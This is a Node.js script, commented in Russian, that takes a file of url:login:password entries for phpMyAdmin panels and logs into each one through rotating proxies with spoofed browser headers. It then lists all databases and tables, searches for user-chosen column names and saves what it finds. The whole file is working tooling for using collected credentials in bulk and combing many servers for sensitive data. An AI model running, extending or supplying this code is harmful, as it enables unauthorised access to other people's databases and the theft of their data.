const fs = require('fs');
const cheerio = require("cheerio");
const axios = require("axios");
const winston = require("winston");
const readline = require('readline');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { HttpsProxyAgent } = require('https-proxy-agent');
const ini = require("ini");

const foundColumnsFilePath = './results/found_columns.txt';
let whatNeeds = ''; // выбор вариантов обработок

// Чтение конфигурации из config.ini
const config = ini.parse(fs.readFileSync('./config.ini', 'utf-8'));
const MAX_CONCURRENT_WORKERS = parseInt(config.settings.max_concurrent_workers, 10) || 5;

// Настройка логгера
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.printf(info => `${info.timestamp} ${info.level}: ${info.message}`)
    ),
    transports: [
        new winston.transports.Console(),
        new winston.transports.File({ filename: './logs/app.log' })
    ]
});

// Чтение прокси из файла
function readProxies(filename) {
    if (fs.existsSync(filename)) {
        return fs.readFileSync(filename, 'utf-8')
            .split('\n')
            .map(line => line.trim())
            .filter(line => line);
    }
    return [];
}

// Чтение данных из файла
function readFileIfExists(filename) {
    if (fs.existsSync(filename)) {
        return new Set(
            fs.readFileSync(filename, 'utf-8')
                .split('\n')
                .map(line => line.trim())
                .filter(line => line)
        );
    }
    return new Set();
}

// Функция для разбора строки
function parseLine(line) {
    const match = line.match(/^(https?:\/\/[^\s:]+(:\d+)?(?:\/[^\s:]*)?):([^:]+):(.+)$/);
    if (match) {
        const [, url, , login, password] = match;
        return { url, login, password };
    }
    return null;
}

class PmaClient {
     phpMyAdminUrl;
     queryUrl;
     cookie;
     login;
     password;
     token;
     pmaCookieVer;
     pma_collation_connection;
     pmaUser_1;
     pmaAuth_1;
     encodedAuth; // для авторизации при ['auth_type'] = 'http'
     session;
     proxy;

    constructor(phpMyAdminUrl, login, password, proxy) {
        this.phpMyAdminUrl = phpMyAdminUrl.endsWith('/') ? phpMyAdminUrl : phpMyAdminUrl + '/';
        this.queryUrl = `${this.phpMyAdminUrl.replace(/index\.php\/?$/, '')}import.php`;
        this.login = login;
        this.password = password;
        this.proxy = proxy;

        const isHTTP = (this.phpMyAdminUrl.split(':')[0].toLowerCase() === 'http');

        // извлекаем данные прокси
        const [proxyHost, proxyPort, proxyUser, proxyPass] = proxy.split(':');
        this.proxyConfig = {
            host: proxyHost,
            port: proxyPort ? parseInt(proxyPort) : undefined,
            auth: proxyUser && proxyPass ? { username: proxyUser, password: proxyPass } : undefined
        };

        // Формируем прокси-URL
        const proxyUrl = `http://${proxyUser}:${proxyPass}@${proxyHost}:${proxyPort}`;

        // Прокси-агент for https
        const httpsAgent = new HttpsProxyAgent(proxyUrl, {
            rejectUnauthorized: false // Отключаем проверку SSL для прокси
        });

        // экземпляр axios с прокси
        this.axiosInstance = axios.create({
            validateStatus: () => true, // Игнорируем ошибки ответа
            proxy: isHTTP && this.proxyConfig,
            httpsAgent,    // для https
            timeout: 5000,
        });
    }

    updateCookies(newCookies) {
        if (!newCookies) return;

        const cookieMap = {
            cookie: ["phpMyAdmin=", "phpMyAdmin_https="],
            pmaCookieVer: ["pmaCookieVer="],
            pma_collation_connection: ["pma_collation_connection="],
            pmaUser_1: ["pmaUser-1=", "pmaUser-1_https="],
            pmaAuth_1: ["pmaAuth-1=", "pmaAuth-1_https="]
        };

        Object.keys(cookieMap).forEach(key => {
            const foundCookie = [...newCookies].reverse().find(cookie =>
                cookieMap[key].some(prefix => cookie.startsWith(prefix))
            );

            if (foundCookie) {
                const cookieValue = foundCookie.split(";")[0];
                if (cookieValue.includes("=deleted")) {
                    return;
                }
                this[key] = cookieValue;
            }
        });
        this.session = this.cookie.replace(/phpMyAdmin(_https)?=/, "");
    }

    updateToken(html) {
        const $ = cheerio.load(html);
        const token = $('input[name="token"]').val();
        if (!token) throw new Error("Не удалось извлечь токен.");
        this.token = token;
    }

    // === Функция для авторизации при ['auth_type'] = 'cookie' ===
    loginAndGetCookies = async () => {

        try {
            // Запрос к странице входа
            const response = await this.axiosInstance.get(this.phpMyAdminUrl, {
                headers: {"User-Agent": "Mozilla/5.0"},
            });
            // Получаем куки из ответа
            const rawCookies = response.headers["set-cookie"];
            if (rawCookies) {
                this.updateCookies(rawCookies);
            }

            // Извлекаем токен из HTML ответа
            this.updateToken(response.data);

            // Отправляем POST-запрос на авторизацию
            const loginResponse = await this.axiosInstance.post(this.phpMyAdminUrl, new URLSearchParams({
                route: "/",
                token: this.token,
                set_session: this.session,
                pma_username: this.login,
                pma_password: this.password,
                server: "1",
            }).toString(), {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0",
                    Cookie: this.cookie,
                },
                maxRedirects: 0,
                validateStatus: (status) => true,
            });

            // Обновляем куки
            const newCookies = loginResponse.headers["set-cookie"];
            if (newCookies) {
                this.updateCookies(newCookies)
            }

            // ищем токен в Headers.Location
            const location = loginResponse.headers?.location;
            if (location.includes('token=')) {
                const tokenMatch = location.match(/[?&]token=([^&]+)/);
                this.token = tokenMatch ? tokenMatch[1] : undefined;
            } else {
            //если нет в Location - делаем Get запрос
                const response1 = await this.axiosInstance.get(this.phpMyAdminUrl, {
                    headers: {
                        "User-Agent": "Mozilla/5.0",
                        Cookie: [this.cookie, this.pmaUser_1, this.pmaAuth_1, 'pma_lang=ru']
                            .filter(Boolean)
                            .join("; ")
                    }
                })
                this.updateToken(response1.data);
                const cookies = response1.headers['set-cookie']
                if (cookies) {
                    this.updateCookies(cookies)
                }
            }
            logger.info(`Авторизация успешна (${this.phpMyAdminUrl}:${this.login}:${this.password}).`);
            return true;
        } catch (error) {
            logger.error(`❌ Ошибка авторизации (${this.login}:${this.password}) → ${error.message}\n${error.stack}`);
            return false;
        }
    };

    // === Функция для выполнения SQL-запросов ===
    executeSQLQuery = async (query) => {
        try {
            const response = await this.axiosInstance.post(this.queryUrl, new URLSearchParams({
                token: this.token,
                sql_query: query,
                is_js_confirmed: "0",
                ajax_request: "true",
                _nocache: Date.now(),
                goto: "server_sql.php",
                ajax_page_request: true
            }).toString(), {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                    Cookie: [this.cookie, this.pmaCookieVer, this.pma_collation_connection, this.pmaUser_1, this.pmaAuth_1]
                        .filter(Boolean)
                        .join("; "),
                    //Authorization: this.encodedAuth, // для авторизации при ['auth_type'] = 'http'
                    "X-Requested-With": "XMLHttpRequest"
                },
            });
            if (!response.data.success) throw new Error ('Запрос не выполнен')
            // Обрабатываем HTML-ответ
            const $ = cheerio.load(response.data.message);
            const databases = $('table.table_results tbody tr').map((_, row) => {
                return $(row).find('td').first().text().trim();
            }).get();
            //logger.info(`Найденные базы данных в ${this.phpMyAdminUrl} (${databases.length}): ${databases.join(", ")}`);
            return databases;

        } catch (error) {
            logger.error("❌ Ошибка выполнения SQL-запроса:", error.message);
        }
    }

    // === Функция для поиска колонок в таблицах ===
    findColumnsInTables = async (database, columns) => {

        const columnsToSearch = columns.split(',').map(col => col.trim());

        const likeConditions = columnsToSearch.map(col => `COLUMN_NAME LIKE '%${col}%'`).join(' OR ');
        try {
            const response = await this.axiosInstance.post(this.queryUrl, new URLSearchParams({
                token: this.token,
                sql_query: `SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA = '${database}' AND (${likeConditions})`,
                is_js_confirmed: "0",
                ajax_request: "true",
                _nocache: Date.now(),
                goto: "server_sql.php",
                ajax_page_request: true
            }).toString(), {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
                    Cookie: [this.cookie, this.pmaCookieVer, this.pma_collation_connection, this.pmaUser_1, this.pmaAuth_1]
                        .filter(Boolean)
                        .join("; "),
                    //Authorization: this.encodedAuth, // для авторизации при ['auth_type'] = 'http'
                    "X-Requested-With": "XMLHttpRequest"
                },
            });
            if (!response.data.success) throw new Error('Запрос не выполнен');
            const $ = cheerio.load(response.data.message);
            return $('table.table_results tbody tr').map((_, row) => {
                return $(row).find('td').map((_, td) => $(td).text().trim()).get();
            }).get();
        } catch (error) {
            logger.error(`Ошибка выполнения SQL-запроса findColumnsInTables: ${error.message}`);
            return [];
        }
    }
}

// Функция для выполнения задачи в потоке
async function workerTask(workerData) {
    const { url, login, password, proxy, columnsToFind, whatNeeds } = workerData;
    const client = new PmaClient(url, login, password, proxy);

    if (await client.loginAndGetCookies()) {
        const databases = await client.executeSQLQuery("SHOW DATABASES;");
        const entry = {
            url: url,
            login: login,
            password: password,
            databases: {}
        };
        logger.info(`Найденные базы данных в ${client.phpMyAdminUrl} (${databases.length}): ${databases.join(", ")}`);

        for (const database of databases) {
            // Поиск колонок
            if (whatNeeds === '1' || whatNeeds === 'both') {
                const foundColumns = await client.findColumnsInTables(database, columnsToFind);
                if (foundColumns.length > 0) {
                    foundColumns.forEach((column) => {
                        fs.appendFileSync(foundColumnsFilePath, `${url}:${login}:${password}|${column}\n`);
                    });
                }
            }

            // Получение списка таблиц
            if (whatNeeds === '2' || whatNeeds === 'both') {
                const tables = await client.executeSQLQuery(`SHOW TABLES FROM \`${database}\``);
                if (tables.length > 0) {
                    entry.databases[database] = tables; // Добавляем таблицы в базу данных
                }
            }

            // Если найдены таблицы, возвращаем результат
            if (Object.keys(entry.databases).length > 0) {
                return entry;
            }
        }
    }
    return null;
}

// Очистка файлов с результатами при запуске программы
if (!fs.existsSync('results'))
    fs.mkdirSync('results', { recursive: true });
fs.writeFileSync(foundColumnsFilePath, '');
fs.writeFileSync('./results/all_tables.json', '[]');

// Основной поток
if (isMainThread) {
    (async () => {
        // запрос данных от пользователя
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        const inputFile = await new Promise((resolve) => {
            rl.question('Введите название файла с данными для поиска (в папке files) [по умолчанию input.txt]: ', (answer) => {
                resolve(answer.trim() || 'input.txt');
            });
        });

        whatNeeds = await new Promise((resolve) => {
            rl.question('Выберите нужный вариант: \n' +
                '1 - Поиск по названию колонок внутри таблиц\n' +
                '2 - Получение списка всех таблиц внутри всех баз данных\n' +
                'Ничего не вводите, если требуется выполнить оба варианта\n', resolve);
        });
        whatNeeds = whatNeeds.trim() || 'both';

        let columnsToFind = '';
        if (whatNeeds === '1' || whatNeeds === 'both') {
            columnsToFind = await new Promise((resolve) => {
                rl.question('Введите названия колонок для поиска (через запятую): ', resolve);
            });
        }

        rl.close();

        const startTime = Date.now();

        const proxies = readProxies('./files/proxies.txt');
        const rawLines = readFileIfExists('./files/' + inputFile);
        const targets = new Set();

        for (const line of rawLines) {
            const parsed = parseLine(line);
            if (parsed) {
                targets.add(parsed);
            }
        }

        const workers = [];
        let proxyIndex = 0;
        const results = [];

        // Счётчик активных потоков
        let activeWorkers = 0;

        for (const { url, login, password } of targets) {
            // Ожидаем, пока количество активных потоков не станет меньше MAX_CONCURRENT_WORKERS
            while (activeWorkers >= MAX_CONCURRENT_WORKERS) {
                await new Promise(resolve => setTimeout(resolve, 100)); // Пауза перед следующей попыткой
            }

            const proxy = proxies[proxyIndex % proxies.length];
            proxyIndex++;

            const workerData = { url, login, password, columnsToFind, whatNeeds };
            if (proxy) workerData.proxy = proxy;
            const worker = new Worker(__filename, { workerData });

            activeWorkers++;  // Увеличиваем счётчик активных потоков

            worker.on('message', (message) => {
                logger.info(`Базы данных с ${JSON.stringify(message.url, null, 2)} обработаны`);
            });

            worker.on('error', (error) => {
                logger.error(`Worker ошибка: ${error.message}`);
            });

            worker.on('exit', (code) => {
                if (code !== 0) {
                    logger.error(`Worker остановлен с кодом выхода: ${code}`);
                }

                activeWorkers--;  // Уменьшаем счётчик активных потоков
            });

            worker.on('message', (entry) => {
                if (entry) {
                    results.push(entry);
                }
            });

            workers.push(worker);
        }

        // Ожидание завершения всех worker'ов
        await Promise.all(workers.map(worker => new Promise((resolve) => {
            worker.on('exit', resolve);
        })));

        // Запись результатов в JSON-файл
        if (whatNeeds === '2' || whatNeeds === 'both') {
            if (results.length > 0) {
                fs.writeFileSync('./results/all_tables.json', JSON.stringify(results, null, 2));
                logger.info(`Результаты записаны в all_tables.json, в папку Results`);
            } else {
                logger.warn('Нет данных для записи в all_tables.json');
            }
        }
        if (whatNeeds === '1' || whatNeeds === 'both') {
            logger.info(`Результаты записаны в found_columns.txt, в папку Results`);
        }

        // Замеряем время выполнения
        const endTime = Date.now();
        const executionTime = (endTime - startTime) / 1000; // В секундах
        logger.info(`Выполнение завершено за ${executionTime.toFixed(2)} сек.`);
    })();
}

 else {
    // Код для worker'а
    workerTask(workerData)
        .then((entry) => {
            if (entry) {
                parentPort.postMessage(entry);
            }
        })
        .catch(err => {
            logger.error(`Worker error: ${err.message}`);
        });
}